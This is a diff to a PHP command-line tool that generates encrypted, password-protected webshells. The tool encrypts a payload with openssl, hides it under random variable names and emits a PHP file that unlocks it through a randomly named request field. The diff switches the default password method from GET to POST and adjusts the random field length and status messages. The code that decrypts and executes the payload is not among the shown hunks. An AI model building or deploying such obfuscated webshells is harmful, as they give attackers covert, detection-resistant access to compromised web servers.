@@ -33,9 +33,10 @@
     if (!isset($payload) || empty($payload))
         die("$argv[0]: Invalid payload!\n");
     $cipher = isset($options['c']) ? $options['c'] : "AES-256-CTR";
+    echo "[+] Encrypting payload using $cipher\n";
     if (!isset($options['o']))
         die("$argv[0]: You must provide a name to the output file!\n");
-    $method = isset($options['m']) ? strtoupper ($options['m']) : "GET";
+    $method = isset($options['m']) ? strtoupper ($options['m']) : "POST";
     echo "[+] The webshell will receive the password using $method\n";
     function hex_encode($str)
     {
@@ -43,12 +44,12 @@
     }
     $iv = random_bytes(16);
     $pass_field = isset($options['n']) ? $options['n'] :
-                  "_" . bin2hex(random_bytes(random_int(5, 60)));
+                  "_" . bin2hex(random_bytes(random_int(5, 40)));
     echo "[+] The password field has the name '$pass_field'\n";
     $payload_var = "_" . bin2hex(random_bytes(random_int(5,60)));
     $encrypted = openssl_encrypt($payload, $cipher, $password, 0, $iv);
     $iv = bin2hex($iv);
-    echo "[+] Payload encrypted with IV: $iv\n";
+    echo "[+] Encrypting with IV: $iv\n";
     $output_code = "<?php \$$payload_var=\"$encrypted\";" .
     (isset($options['s']) ? "session_start();" : "") . "if(!empty(" .
     "\$$pass_field=\$_${method}['$pass_field']))";
@@ -75,5 +76,5 @@
         die("$argv[0]: Can't open " . $options['o'] . " to write\n");
     fwrite($out_file, $output_code);
     fclose($out_file);
-    echo "[+] File was saved as " . $options['o'] . "\n";
+    echo "[+] File was saved as '" . $options['o'] . "'\n";
 ?>
